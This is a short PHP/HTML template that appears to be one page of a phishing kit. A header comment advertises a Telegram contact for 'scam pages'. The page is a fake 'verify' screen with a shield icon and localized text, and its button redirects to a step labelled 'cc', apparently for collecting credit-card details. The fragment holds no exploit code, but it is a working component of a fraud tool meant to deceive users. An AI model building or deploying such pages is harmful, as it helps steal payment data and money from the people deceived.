<?php
    ...
    Contact me on telegram : https://t.me/Alexscampages
    ********************************************************/
    
    require_once '../app/config.php';
    $_SESSION['last_page'] = 'verify';
?>
<!doctype html>
<html>
    ...
    <body class="index-wrap">
        ...
        <div id="index">
            ...
            <!-- LOGIN AREA -->
            <div class="login-area" style="padding: 65px 30px;">
                <div class="verify">
                    <div class="img"><img src="../media/imgs/shield.png"></div>
                    <h3><?php echo get_text('verify_title'); ?></h3>
                    <p>
                        <?php echo get_text('verify_text'); ?>
                    </p>
                    <a href="../index.php?redirection=cc"><?php echo get_text('verify_button'); ?></a>
                </div>
            </div>
            <!-- END LOGIN AREA -->
